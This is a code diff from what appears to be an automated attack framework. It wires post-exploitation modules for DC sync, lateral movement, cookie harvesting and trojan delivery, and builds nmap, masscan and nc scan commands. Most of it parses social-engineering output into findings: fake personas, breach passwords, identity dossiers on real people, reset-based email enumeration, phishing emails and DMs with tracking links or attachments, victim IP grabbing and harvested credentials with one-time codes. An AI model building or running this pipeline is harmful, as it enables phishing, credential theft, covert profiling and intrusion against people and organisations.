+        "dc_sync_interpreter": "phantom.automation.post.ad",
+        "hash_crack_interpreter": "phantom.automation.post.ad",
+        "lateral_interpreter": "phantom.automation.post.lateral",
+        "smb_pivot_interpreter": "phantom.automation.post.lateral",
+        "winrm_pivot_interpreter": "phantom.automation.post.lateral",
+        "cleanup_interpreter": "phantom.automation.post.cleanup",
+        "cookies_interpreter": "phantom.automation.post.harvest",
+        "bt_scan_interpreter": "phantom.automation.post.harvest",
+        "cdp_cookies_interpreter": "phantom.automation.post.harvest",
+        "socks_interpreter": "phantom.automation.post.harvest",
+        "ransom_sim_interpreter": "phantom.automation.post.ransom_sim",
+        "trojan_deliver_interpreter": "phantom.automation.post.trojan",
+        "internal_recon_interpreter": "phantom.automation.post.internal_recon",
+        "internal_probe_interpreter": "phantom.automation.post.internal_recon",
+    }
+
+    def _interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
+        import importlib
+        module = importlib.import_module(_MODULES[func_name])
+        return getattr(module, func_name)(output, wm, slots)
+
+    return _interp
+
+
+# ---------------------------------------------------------------------------
+# social / identity capability builders
+# ---------------------------------------------------------------------------
+
+_SOCIAL_MARKERS = {
+    "identity": "IDENTITY:",
+    "breach": "BREACH:",
+    "breach_exposure": "BREACH_EXPOSURE:",
+    "persona": "PERSONA:",
+    "persona_profile": "PERSONA_PROFILE:",
+    "dossier": "DOSSIER:",
+    "dossier_recommend": "DOSSIER_RECOMMEND:",
+    "profile": "PROFILE:",
+    "account_link": "ACCOUNT_LINK:",
+    "recon_state": "RECON_STATE:",
+    "commenter": "COMMENTER:",
+    "tagged": "TAGGED_IN:",
+    "trace": "TRACE:",
+    "mention": "MENTION:",
+    "co_commenter": "CO_COMMENTER:",
+    "search_hit": "SEARCH_HIT:",
+    "wayback": "WAYBACK:",
+    "surface_domain": "SURFACE_DOMAIN:",
+    "surface_asset": "SURFACE_ASSET:",
+    "phish": "PHISH_SENT:",
+    "campaign": "CAMPAIGN:",
+    "open": "OPEN:",
+    "creds": "CREDS:",
+    "victim_ip": "VICTIM_IP:",
+    "dm": "DM_SENT:",
+    "dm_file": "DM_FILE:",
+    "dm_attach": "DM_ATTACH:",
+    "dm_stage": "DM_STAGE:",
+    "dm_plan": "DM_PLAN:",
+    "dm_decision": "DM_DECISION:",
+    "follow_sent": "FOLLOW_SENT:",
+    "follow_accepted": "FOLLOW_ACCEPTED:",
+    "identity_conf": "IDENTITY_CONF:",
+    "identity_ambiguous": "IDENTITY_AMBIGUOUS:",
+    "identity_resolved": "IDENTITY_RESOLVED:",
+    "identity_widened": "IDENTITY_WIDENED:",
+    "avatar": "AVATAR:",
+    "recon_scope": "RECON_SCOPE:",
+    # identity-field primitives (I2)
+    "email_candidate": "EMAIL_CANDIDATE:",
+    "email_masked": "EMAIL_MASKED:",
+    "email_verified": "EMAIL_VERIFIED:",
+    "service_account": "SERVICE_ACCOUNT:",
+    # deliverability of the target's OWN sending domain (surface pass):
+    # SPF/DMARC/MX answered live, scored by social/domain_readiness
+    "domain_readiness": "DOMAIN_READINESS:",
+}
+
+
+def _parse_marker_line(line: str, marker: str) -> Dict[str, Any]:
+    if not line.startswith(marker):
+        return {}
+    kv = {}
+    for chunk in line[len(marker):].split():
+        if "=" in chunk:
+            k, v = chunk.split("=", 1)
+            kv[k.strip()] = v.strip()
+    return kv
+
+
+def _social_interp(output: str, wm: WorldModel, slots: Dict[str, Any]) -> List[Finding]:
+    """Shared interpreter for social capabilities: parses the stable
+    markers produced by the SocialEngine into typed findings."""
+    findings: List[Finding] = []
+    for line in (output or "").splitlines():
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["identity"])
+        if kv.get("username") or kv.get("email") or kv.get("phone"):
+            findings.append(Finding(
+                kind="identity",
+                key=f"identity:{kv.get('username', kv.get('email', kv.get('phone')))}",
+                value={"username": kv.get("username", ""),
+                       "email": kv.get("email", ""),
+                       "phone": kv.get("phone", ""),
+                       "carrier": kv.get("carrier", ""),
+                       "region": kv.get("region", ""),
+                       "platform": kv.get("platform", ""),
+                       "url": kv.get("url", "")},
+                confidence=0.7, source="osint", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["breach_exposure"])
+        if kv.get("email") and kv.get("breach"):
+            findings.append(Finding(
+                kind="breach_exposure", key=f"breach:{kv['breach']}",
+                value={"email": kv.get("email"),
+                       "breach": kv.get("breach"),
+                       "date": kv.get("date", "")},
+                confidence=0.6, source="breach_check", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["breach"])
+        if kv.get("email") and kv.get("password"):
+            findings.append(Finding(
+                kind="creds", key=f"breach:{kv['email']}",
+                value={"username": kv.get("email"),
+                       "password": kv.get("password"),
+                       "valid": False, "service": "leak",
+                       "source": kv.get("source", "breach")},
+                confidence=0.6, source="breach_check", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["persona"])
+        if kv.get("email"):
+            findings.append(Finding(
+                kind="identity", key=f"persona:{kv['email']}",
+                value={"email": kv.get("email"), "mailbox": kv.get("mailbox", ""),
+                       "role": "persona"},
+                confidence=0.9, source="persona_create", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["persona_profile"])
+        if kv.get("name"):
+            findings.append(Finding(
+                kind="persona_profile", key=f"persona_profile:{kv['name']}",
+                value={"name": kv.get("name"), "age": kv.get("age", ""),
+                       "job": kv.get("job", ""), "location": kv.get("location", ""),
+                       "avatar": kv.get("avatar", "")},
+                confidence=0.85, source="persona_create", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["dossier_recommend"])
+        if kv.get("pretext"):
+            findings.append(Finding(
+                kind="dossier", key="dossier:recommend",
+                value={"pretext": kv.get("pretext"),
+                       "score": kv.get("score", "")},
+                confidence=0.8, source="dossier", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["profile"])
+        if kv.get("username") and kv.get("platform"):
+            findings.append(Finding(
+                kind="profile", key=f"profile:{kv['username']}",
+                value={"username": kv.get("username"),
+                       "platform": kv.get("platform"),
+                       "private": kv.get("private", "0") == "1",
+                       "bio": kv.get("bio", ""), "link": kv.get("link", "")},
+                confidence=0.75, source="profile_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["account_link"])
+        if kv.get("handle") and kv.get("url"):
+            findings.append(Finding(
+                kind="account_link", key=f"account_link:{kv['handle']}:{kv.get('platform', kv.get('source', ''))}",
+                value={"handle": kv.get("handle"),
+                       "platform": kv.get("platform", kv.get("source", "")),
+                       "url": kv.get("url"),
+                       "evidence": kv.get("evidence", "")},
+                confidence=0.7, source="profile_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["recon_state"])
+        if kv.get("username") and kv.get("state"):
+            # `state=missing` is the outcome of a PROBE, not proof of an
+            # account — and `unknown` is a page we could not read at all.
+            # Keeping auto-mode's confidence curve for them (up to 0.90 for an
+            # agreed vote) made "we looked and it is not there" and "we could
+            # not read the page" indistinguishable from "the profile is here".
+            absent = kv.get("state") in ("missing", "unknown")
+            findings.append(Finding(
+                kind="profile", key=f"profile:{kv['username']}",
+                value={"username": kv.get("username"),
+                       "platform": kv.get("platform", ""),
+                       "private": kv.get("state") == "private",
+                       "state": kv.get("state", "unknown"),
+                       "state_confidence": kv.get("conf", "0"),
+                       "followers": kv.get("followers", ""),
+                       "full_name": kv.get("fullname", "").replace("_", " ")},
+                confidence=(0.2 if absent
+                            else min(0.9, 0.5 + float(kv.get("conf", "0") or 0) * 0.4)),
+                source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["commenter"])
+        if kv.get("handle"):
+            findings.append(Finding(
+                kind="account_link",
+                key=f"account_link:{kv['handle']}:{kv.get('platform', 'social')}",
+                value={"handle": kv.get("handle"),
+                       "platform": kv.get("platform", ""),
+                       "relation": "commenter",
+                       "on": kv.get("on", ""),
+                       "evidence": kv.get("evidence", "")},
+                confidence=0.55, source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["tagged"])
+        if kv.get("handle"):
+            findings.append(Finding(
+                kind="account_link",
+                key=f"account_link:{kv['handle']}:{kv.get('platform', 'social')}",
+                value={"handle": kv.get("handle"),
+                       "platform": kv.get("platform", ""),
+                       "relation": "tagged",
+                       "evidence": kv.get("evidence", "")},
+                confidence=0.45, source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["trace"])
+        if kv.get("handle"):
+            findings.append(Finding(
+                kind="account_link",
+                key=f"account_link:{kv['handle']}:{kv.get('platform', 'social')}:trace",
+                value={"handle": kv.get("handle"),
+                       "platform": kv.get("platform", ""),
+                       "relation": "trace",
+                       "on": kv.get("on", ""),
+                       "evidence": kv.get("evidence", "")},
+                confidence=0.6, source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["mention"])
+        if kv.get("handle"):
+            findings.append(Finding(
+                kind="account_link",
+                key=f"account_link:{kv['handle']}:{kv.get('platform', 'social')}:mention",
+                value={"handle": kv.get("handle"),
+                       "platform": kv.get("platform", ""),
+                       "relation": "mention",
+                       "mentions": kv.get("mentions", ""),
+                       "evidence": kv.get("evidence", "")},
+                confidence=0.55, source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["co_commenter"])
+        if kv.get("handle"):
+            findings.append(Finding(
+                kind="account_link",
+                key=f"account_link:{kv['handle']}:{kv.get('platform', 'social')}:co_commenter",
+                value={"handle": kv.get("handle"),
+                       "platform": kv.get("platform", ""),
+                       "relation": "co_commenter",
+                       "evidence": kv.get("evidence", "")},
+                confidence=0.55, source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["identity_conf"])
+        if kv.get("handle") and kv.get("tier"):
+            try:
+                score = float(kv.get("score", "0") or 0)
+            except ValueError:
+                score = 0.0
+            findings.append(Finding(
+                kind="identity_conf",
+                key=f"identity_conf:{kv['handle']}:{kv.get('platform', '')}",
+                value={"handle": kv.get("handle"),
+                       "platform": kv.get("platform", ""),
+                       "tier": kv.get("tier", "unrelated"),
+                       "score": score,
+                       "contact_ok": kv.get("contact", "0") == "1",
+                       "why": kv.get("why", "").replace("_", " ")},
+                confidence=score if score else 0.3,
+                source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["identity_ambiguous"])
+        if kv.get("candidates"):
+            findings.append(Finding(
+                kind="identity_ambiguous",
+                key=f"identity_ambiguous:{kv['candidates'][:80]}",
+                value={"candidates": kv.get("candidates", ""),
+                       "decision": kv.get("decision", ""),
+                       "evidence": kv.get("evidence", "").replace("_", " ")},
+                confidence=0.7, source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["identity_resolved"])
+        if kv.get("winner") is not None:
+            findings.append(Finding(
+                kind="identity_resolved",
+                key=f"identity_resolved:{kv.get('winner', 'none')}",
+                value={"winner": kv.get("winner", ""),
+                       "by": kv.get("by", ""),
+                       "evidence": kv.get("evidence", "").replace("_", " ")},
+                confidence=0.9 if kv.get("winner", "none") != "none"
+                else 0.5,
+                source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["identity_widened"])
+        if kv.get("handle"):
+            findings.append(Finding(
+                kind="identity_widened",
+                key=f"identity_widened:{kv['handle']}",
+                value={"handle": kv.get("handle"),
+                       "platform": kv.get("platform", "")},
+                confidence=0.5, source="deep_recon", target=wm.target))
+        # The operator's OSINT scope is a RECEIPT, and receipts have to be
+        # visible: `SEARCH_HIT`/`WAYBACK` were emitted as plain lines that
+        # nothing interpreted, so "every correspondence found elsewhere"
+        # existed in a string nobody read. They become facts now.
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["recon_scope"])
+        if kv.get("mode"):
+            findings.append(Finding(
+                kind="recon_scope",
+                key=f"recon_scope:{kv.get('mode')}:{kv.get('platform', '')}",
+                value={"mode": kv.get("mode", ""),
+                       "platform": kv.get("platform", ""),
+                       "excluded": kv.get("excluded", ""),
+                       "platforms": kv.get("platforms", "")},
+                confidence=0.95, source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["search_hit"])
+        if kv.get("url"):
+            findings.append(Finding(
+                kind="search_hit",
+                key=f"search_hit:{kv['url'][:80]}",
+                value={"url": kv.get("url", "")[:300],
+                       "platform": kv.get("platform", ""),
+                       "evidence": kv.get("evidence", "")},
+                confidence=0.5, source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["wayback"])
+        if kv.get("url"):
+            findings.append(Finding(
+                kind="wayback",
+                key=f"wayback:{kv['url'][:80]}",
+                value={"url": kv.get("url", "")[:300],
+                       "evidence": kv.get("evidence", "")},
+                confidence=0.6, source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["email_candidate"])
+        # The marker carries the address MASKED (a guess must not read like a
+        # discovered address), but verification needs the full address. The
+        # identity path therefore also emits local+domain, and it is
+        # reconstructed here: raw in `email` for the prober, masked for every
+        # report/key. A marker with only a mask (post-verification) keeps it.
+        raw = str(kv.get("email") or "")
+        if "@" not in raw and kv.get("local") and kv.get("domain"):
+            raw = f"{kv.get('local')}@{kv.get('domain')}"
+        masked = kv.get("masked") or (_mask_addr(raw) if "@" in raw else raw)
+        cand = raw or masked
+        if cand:
+            findings.append(Finding(
+                kind="email_candidate", key=f"email_candidate:{masked}",
+                value={"email": raw or masked, "masked": masked,
+                       "local_part": kv.get("local", ""),
+                       "domain": kv.get("domain", ""),
+                       "pattern": kv.get("pattern", ""),
+                       "score": kv.get("score", "")},
+                confidence=0.3, source="email_candidates", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["email_masked"])
+        if kv.get("masked"):
+            findings.append(Finding(
+                kind="email_masked", key=f"email_masked:{kv['masked']}",
+                value={"masked": kv.get("masked"),
+                       "prefix": kv.get("prefix", ""),
+                       "suffix": kv.get("suffix", ""),
+                       "domain": kv.get("domain", ""),
+                       "length": kv.get("length", "")},
+                confidence=0.8, source="reset_enum", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["email_verified"])
+        verified = kv.get("masked") or kv.get("email", "")
+        if verified:
+            exists = kv.get("exists", "unknown")
+            conf = 0.85 if exists == "1" else (0.2 if exists == "0" else 0.4)
+            findings.append(Finding(
+                kind="email_verified", key=f"email_verified:{verified}",
+                value={"email": verified, "masked": kv.get("masked", ""),
+                       "exists": exists, "reason": kv.get("reason", "")},
+                confidence=conf, source="email_verify", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["dm_decision"])
+        if kv.get("action"):
+            # The conversation state machine's decision is a first-class
+            # fact: stop/handoff must be visible to the planner, not buried
+            # in a free-text reason line.
+            action = kv.get("action", "")
+            findings.append(Finding(
+                kind="dm_decision",
+                key=f"dm_decision:{kv.get('handle', wm.target)}",
+                value={"handle": kv.get("handle", ""),
+                       "action": action,
+                       "stage": kv.get("stage", ""),
+                       "state": kv.get("state", ""),
+                       "link_allowed": kv.get("link_allowed", "0") == "1",
+                       "reason": kv.get("reason", "")},
+                confidence=(0.85 if action in ("stop", "handoff") else 0.6),
+                source="dm_flow", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["service_account"])
+        if kv.get("email"):
+            findings.append(Finding(
+                kind="service_account", key=f"service_account:{kv['email']}",
+                value={"email": kv.get("email"),
+                       "service": kv.get("service", ""),
+                       "known": kv.get("known", "")},
+                confidence=0.4, source="breach_correlate", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["avatar"])
+        if kv.get("username") and kv.get("url"):
+            findings.append(Finding(
+                kind="avatar",
+                key=f"avatar:{kv['username']}:{kv.get('platform', '')}",
+                value={"username": kv.get("username"),
+                       "platform": kv.get("platform", ""),
+                       "url": kv.get("url", "")[:300]},
+                confidence=0.8, source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["domain_readiness"])
+        if kv.get("domain"):
+            try:
+                score = float(kv.get("score", "0") or 0)
+            except (TypeError, ValueError):
+                score = 0.0
+            # A domain with no SPF/DKIM/DMARC is spoofable, which is a real
+            # attack path against the target's own customers and staff — the
+            # confidence IS the readiness score, so a hardened domain ranks
+            # last instead of looking like a hole.
+            findings.append(Finding(
+                kind="domain_readiness",
+                key=f"dns:{kv['domain']}",
+                value={"domain": kv.get("domain", ""),
+                       "score": score,
+                       "grade": kv.get("grade", ""),
+                       "ready": kv.get("ready", "0") == "1",
+                       "issues": kv.get("issues", "none")},
+                confidence=max(0.0, min(1.0, (100.0 - score) / 100.0)),
+                source="surface_map", target=wm.target))
+        kv = _parse_marker_line(line, "SESSION_USED:")
+        if not kv.get("platforms"):
+            # same receipt from the local reader (no beacon involved)
+            kv = _parse_marker_line(line, "SESSION_LOCAL:")
+        if kv.get("platforms"):
+            # operator-session receipt: WHICH platform views went out
+            # authed (counts/platforms only — values never enter markers)
+            findings.append(Finding(
+                kind="session_used",
+                key=f"session_used:{kv['platforms'][:60]}",
+                value={"platforms": kv.get("platforms", ""),
+                       "source": kv.get("source", "operator_session"),
+                       "readonly": kv.get("readonly", "1")},
+                confidence=0.9, source="deep_recon", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["surface_domain"])
+        if kv.get("domain"):
+            findings.append(Finding(
+                kind="environment", key=f"surface:{kv['domain']}",
+                value={"domain": kv.get("domain"),
+                       "assets": kv.get("assets", "0")},
+                confidence=0.9, source="surface_map", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["surface_asset"])
+        if kv.get("value") and kv.get("kind"):
+            try:
+                risk = float(kv.get("risk", "0.3") or 0.3)
+            except (TypeError, ValueError):
+                risk = 0.3
+            # high-risk surface assets are real attack-path candidates:
+            # VPN gateways / SSO portals feed the phish+pivot chain, weak
+            # SPF/DMARC feeds the spoofing chain, dev hosts feed scan_tcp
+            findings.append(Finding(
+                kind="environment", key=f"surface:{kv['value'][:80]}",
+                value={"kind": kv.get("kind"), "asset": kv.get("value"),
+                       "risk": risk, "detail": kv.get("detail", "")},
+                confidence=min(0.9, 0.4 + risk * 0.5),
+                source="surface_map", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["phish"])
+        if kv.get("to") and kv.get("link"):
+            findings.append(Finding(
+                kind="phish", key=f"phish:{kv['to']}",
+                value={"to": kv.get("to"), "channel": kv.get("channel", "email"),
+                       "link": kv.get("link")},
+                confidence=0.9, source="phish", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["victim_ip"])
+        if kv.get("ip"):
+            findings.append(Finding(
+                kind="victim_ip", key=kv["ip"],
+                value={"ip": kv["ip"], "user_agent": kv.get("ua", ""),
+                       "time": kv.get("when", "")},
+                confidence=0.9, source="grabber", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["campaign"])
+        if kv.get("id") and kv.get("to"):
+            findings.append(Finding(
+                kind="campaign", key=f"campaign:{kv['id']}:{kv['to']}",
+                value={"id": kv.get("id"), "pretext": kv.get("pretext", ""),
+                       "to": kv.get("to"), "status": kv.get("status", "sent"),
+                       "link": kv.get("link", "")},
+                confidence=0.9, source="phish", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["open"])
+        if kv.get("to") and kv.get("ip"):
+            findings.append(Finding(
+                kind="phish_open", key=f"open:{kv['to']}:{kv['ip']}",
+                value={"to": kv.get("to"), "ip": kv.get("ip")},
+                confidence=0.7, source="grabber", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["creds"])
+        if kv.get("password"):
+            # harvested credentials are a REAL foothold: verified against a
+            # live service by the planner before use, but they are the
+            # strongest credential signal the social chain can produce
+            findings.append(Finding(
+                kind="creds", key=f"phish:{kv.get('username') or kv.get('email')}",
+                value={"username": kv.get("username") or kv.get("email"),
+                       "password": kv.get("password"),
+                       "otp": kv.get("otp", ""),
+                       "valid": False, "service": "harvest",
+                       "source": "phish_harvest"},
+                confidence=0.8, source="phish_harvest", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["dm_file"])
+        if kv.get("to"):
+            # the ATTACHMENT path: a FILE was the message, so there is no
+            # link — but the contact happened and the chain must see it like
+            # any delivered DM (opening the artefact converges on the same
+            # grabber, which is where victim_ip comes from).
+            findings.append(Finding(
+                kind="dm_sent", key=f"dm:{kv['to']}",
+                value={"to": kv.get("to"), "platform": kv.get("platform", ""),
+                       "link": "", "attachment": kv.get("name", ""),
+                       "delivered": kv.get("delivered", "0") == "1"},
+                confidence=0.75 if kv.get("delivered") == "1" else 0.3,
+                source="dm_launch", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["dm_attach"])
+        if kv.get("to"):
+            findings.append(Finding(
+                kind="dm_attach", key=f"dm_attach:{kv['to']}",
+                value={"to": kv.get("to"), "platform": kv.get("platform", ""),
+                       "strategy": kv.get("strategy", ""),
+                       "note": kv.get("note", "")},
+                confidence=0.7, source="dm_launch", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["dm_stage"])
+        if kv.get("to"):
+            findings.append(Finding(
+                kind="dm_stage", key=f"dm_stage:{kv['to']}",
+                value={"to": kv.get("to"), "stage": kv.get("stage", ""),
+                       "of": kv.get("of", ""), "note": kv.get("note", ""),
+                       "link_held": kv.get("link", "") == "held",
+                       "delivered": kv.get("delivered", "0") == "1"},
+                confidence=0.7 if kv.get("delivered") == "1" else 0.3,
+                source="dm_launch", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["dm_plan"])
+        if kv.get("platform"):
+            # the CHANNEL DECISION, recorded: the reasoning log shows WHY a
+            # strategy was chosen (and what is missing) instead of asserting
+            findings.append(Finding(
+                kind="dm_plan", key=f"dm_plan:{kv.get('platform')}",
+                value={"platform": kv.get("platform"),
+                       "strategy": kv.get("strategy", ""),
+                       "carries_file": kv.get("carries_file", "0") == "1",
+                       "masked": kv.get("masked", "0") == "1",
+                       "kind": kv.get("kind", ""),
+                       "needs": kv.get("needs", "")},
+                confidence=0.9, source="dm_launch", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["dm"])
+        if kv.get("to"):
+            # a delivered DM with a tracking link is a phish on another
+            # channel: same downstream value (click -> victim_ip)
+            findings.append(Finding(
+                kind="dm_sent", key=f"dm:{kv['to']}",
+                value={"to": kv.get("to"), "platform": kv.get("platform", ""),
+                       "link": kv.get("link", ""),
+                       "delivered": kv.get("delivered", "0") == "1"},
+                confidence=0.8 if kv.get("delivered") == "1" else 0.3,
+                source="dm_launch", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["follow_sent"])
+        if kv.get("handle"):
+            findings.append(Finding(
+                kind="follow_sent", key=f"follow:{kv['handle']}",
+                value={"handle": kv.get("handle"),
+                       "platform": kv.get("platform", ""),
+                       "delivered": kv.get("delivered", "0") == "1",
+                       "note": kv.get("note", "")},
+                confidence=0.7, source="dm_follow", target=wm.target))
+        kv = _parse_marker_line(line, _SOCIAL_MARKERS["follow_accepted"])
+        if kv.get("handle"):
+            findings.append(Finding(
+                kind="follow_accepted", key=f"follow:{kv['handle']}",
+                value={"handle": kv.get("handle"),
+                       "platform": kv.get("platform", "")},
+                confidence=0.9, source="wait_follow", target=wm.target))
+    return findings
+
+
+def store_social_markers(output: str, wm: WorldModel,
+                         slots: Optional[Dict[str, Any]] = None) -> List[Finding]:
+    """Interpret marker text and STORE it in `wm`; returns what was stored.
+
+    The public door for callers outside the auto loop. The markers are the
+    only durable output of a recon run: auto mode runs them through
+    `_social_interp` and stores the findings, but the manual
+    `social graph --run` printed four summary lines and dropped the rest — so
+    the offline `social graph` (no network) answered "empty" seconds after a
+    successful `--run`, and `--json`/`--graphml` exported an empty graph.
+
+    Storage mirrors the agent's rule (`_register_findings`): the finding keeps
+    its OWN source, and a value belief revision refuses is simply not
+    recorded. One mapping, one place.
+    """
+    stored: List[Finding] = []
+    for f in _social_interp(output or "", wm, slots or {}):
+        try:
+            kept = wm.add_finding(f.kind, f.key, f.value,
+                                  confidence=f.confidence,
+                                  source=f.source or "deep_recon",
+                                  evidence=getattr(f, "evidence", "") or "")
+        except Exception:
+            continue
+        stored.append(kept if kept is not None else f)
+    return stored
+
+
+def _email_candidates_adapter(wm, slots):
+    return f"social-email-candidates {wm.target}"
+
+
+def _reset_enum_adapter(wm, slots):
+    return f"social-reset-enum {wm.target}"
+
+
+def _email_verify_adapter(wm, slots):
+    return f"social-email-verify {wm.target}"
+
+
+def _breach_correlate_adapter(wm, slots):
+    return f"social-breach-correlate {wm.target}"
+
+
+def _osint_identity_adapter(wm, slots):
+    return f"social-osint {wm.target}"
+
+
+def _breach_check_adapter(wm, slots):
+    return f"social-breach {wm.target}"
+
+
+def _persona_create_adapter(wm, slots):
+    return "social-persona"
+
+
+def _persona_profile_adapter(wm, slots):
+    return "social-persona-profile"
+
+
+def _dossier_adapter(wm, slots):
+    return "social-dossier"
+
+
+def _profile_recon_adapter(wm, slots):
+    platform = slots.get("platform", "")
+    if platform:
+        return f"social-profile-recon {wm.target} {platform}"
+    return f"social-profile-recon {wm.target}"
+
+
+def _phish_adapter(wm, slots):
+    return f"social-phish {wm.target}"
+
+
+def _surface_map_adapter(wm, slots):
+    return f"social-surface-map {wm.target}"
+
+
+def _poll_hits_adapter(wm, slots):
+    return "social-poll"
+
+
+def _campaign_adapter(wm, slots):
+    return f"social-campaign {wm.target}"
+
+
+def _harvest_adapter(wm, slots):
+    return "social-harvest"
+
+
+def _dm_adapter(wm, slots):
+    return "social-dm"
+
+
+def _dm_stage2_adapter(wm, slots):
+    return "social-dm-stage2"
+
+
+# ---------------------------------------------------------------------------
+# capability builders
+# ---------------------------------------------------------------------------
+
+def _chosen_tool(wm, capability: str, default: str) -> str:
+    """The tool the agent's toolbelt picked for a capability, or the
+    legacy default when the stamp is absent (direct adapter use in
+    tests / manual suggest paths)."""
+    stamp = getattr(wm, "chosen_tool", None)
+    if isinstance(stamp, dict) and stamp.get("capability") == capability:
+        tool = stamp.get("tool")
+        if tool:
+            return tool   # includes "__internal__": adapters route on it
+    return default
+
+
+def _full_range(ports) -> bool:
+    """True when the slot asks for the whole TCP range.
+
+    The escalation passes ``1-65535``; operators also type ``-p-`` or
+    ``0-65535``. A full sweep needs its OWN timing/retry bounds: the old
+    command relied on the profile's ``-T2`` and the capability's 240 s
+    timeout, so on a filtered host nmap was killed long before the high
+    ports (5040/5357/7680 on a real Windows box) were ever reached.
+    """
+    if not ports:
+        return False
+    spec = str(ports).strip().lower()
+    return ("1-65535" in spec or "0-65535" in spec
+            or spec in ("-", "-p-"))
+
+
+def _full_scan_timing(style: str) -> str:
+    """Bounded timing for a 1-65535 sweep.
+
+    The rate cap is what makes the sweep finish inside the capability
+    timeout: at 500 pps the 65k probes take ~130 s, at 2000 pps ~33 s.
+    ``--max-retries 1`` keeps a filtered port from costing a second and a
+    half, and ``--host-timeout`` guarantees nmap returns partial results
+    (open ports found before the cap) instead of being SIGKILLed by the
+    runtime with no output at all.
+    """
+    # Live 2026-10-26: the old `-T2 --min-rate 500` did not finish a
+    # connect scan of a Windows host inside the 200 s host timeout, so nmap
+    # exited non-zero with no parsed services and AUTO-MODE never saw the
+    # real ports (5040/5357). `-T3 --min-rate 1000` completed the same sweep
+    # in ~130 s on that host without switching to a loud profile.
+    if style == "full_stealth":
+        return "-T3 --min-rate 1000"
+    if style == "top_loud":
+        return "-T4 --min-rate 2000"
+    if style == "top_fast":
+        return "-T4 --min-rate 1500"
+    return "-T4 --min-rate 1500"
+
+
+def _port_scan_adapter(wm, slots):
+    ports = slots.get("port")
+    tool = _chosen_tool(wm, "scan_tcp", "nmap")
+    target = _effective_target(wm)
+    own_port = split_host_port(_resolve_target_address(wm))[1]
+    style = getattr(wm, "scan_style", "balanced")
+    if tool == "masscan":
+        # fastest full-range sweep: rate-capped to stay survivable,
+        # nmap -sV still runs afterwards via version_detect for banners
+        rate = "2000" if style != "full_stealth" else "500"
+        if ports:
+            return f"masscan {target} -p {ports} --rate {rate}"
+        return f"masscan {target} -p 1-65535 --rate {rate}"
+    if tool == "nc":
+        # zero-dependency floor: connect-scan via nc itself (no bash -c,
+        # so the command also passes the API allowlist when the operator
+        # drives scan_tcp manually from Electron). nc accepts multiple
+        # ports and N-M ranges as separate args.
+        spec = str(ports or _nc_port_spec(wm))
+        if own_port and str(own_port) not in spec.split():
+            # The operator named a service (`host:9443`): scan it even when
+            # the shortlist does not carry that non-standard port.
+            spec = f"{own_port} {spec}"
+        return f"nc -zv -w 1 {target} {spec} 2>&1"
+    if ports:
+        if _full_range(ports):
+            return (f"nmap -Pn -sT -n -p {ports} {_full_scan_timing(style)} "
+                    f"--max-retries 1 --host-timeout 200s {target}")
+        return (f"nmap -Pn -sT -p {ports} --max-retries 1 "
+                f"--host-timeout 120s {target}")
+    if own_port:
+        return (f"nmap -Pn -sT -p {own_port} --max-retries 1 "
+                f"--host-timeout 120s {target}")
+    return f"nmap -Pn -sT {_scan_port_spec(wm)} {target}"
+
+
+def _nc_port_spec(wm) -> str:
+    """Port list for the nc floor sweep — the profile's coverage, scaled
+    down: a connect() per port is ~100x slower than nmap, so the floor
+    sweep covers the top ports + the web/remote range where footholds
+    actually live."""
+    style = getattr(wm, "scan_style", "balanced")
+    if style in ("top_fast", "top_loud"):
+        return "21 22 23 25 53 80 110 111 135 139 143 443 445 993 995 1723 3306 3389 5432 5900 6379 8080 8443"
